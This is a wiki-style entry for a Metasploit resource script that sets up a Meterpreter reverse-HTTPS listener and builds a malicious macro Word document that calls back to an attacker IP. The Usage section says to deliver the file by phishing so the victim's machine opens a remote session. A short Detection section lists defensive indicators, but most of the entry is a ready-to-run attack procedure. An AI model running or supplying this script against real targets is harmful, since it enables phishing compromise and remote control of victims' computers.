---
id: a89609b9-4c15-423d-b388-583442cd2cca
name: metasploit-rc-content-for-word-macro-reverse-https
type: code
language: msfconsole
verified: true
created_at: '2023-04-06T03:56:21.645177+00:00'
updated_at: '2023-04-10T20:25:01.008662+00:00'
platforms:
  - Linux
  - Windows
tags:
  - metasploit
  - scripting
  - payload
validated: true
---

# metasploit-rc-content-for-word-macro-reverse-https

## Code

```msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4646
set ExitOnSession false
exploit -j -z


use exploit/multi/fileformat/office_word_macro 
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.10.14.22
set LPORT 4646
exploit
```

## Description

This Metasploit resource script automates the setup of a reverse HTTPS handler and generates a malicious Word document with an embedded Meterpreter payload. When pasted into a .rc file and executed via msfconsole -r, it starts the listener and creates the exploit file for delivery.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `LHOST` | Attacker IP for payload callback (handler uses 0.0.0.0 for binding, exploit uses specific IP) | `10.10.14.22` |
| `LPORT` | Port for HTTPS reverse connection | `4646` |

## Usage

Save this exact content to 'exploit.rc', then run `msfconsole -r exploit.rc`. Deliver the generated 'document.doc' via phishing. Victim enables macro, payload executes, and connects to handler for Meterpreter session.

## Detection

- Metasploit process (msfconsole, ruby) on attacker side via host-based monitoring.
- Unusual .doc files with VBA macros; scan with antivirus or macro analyzers.
- Outbound HTTPS to attacker IP/port from Office processes; log PowerShell or rundll32 spawns from winword.exe.

## Related

- [[procedures/Metasploit-Scripting-with-Meterpreter-Reverse-HTTPS-Payload]]
- [[tools/Metasploit-Framework]]
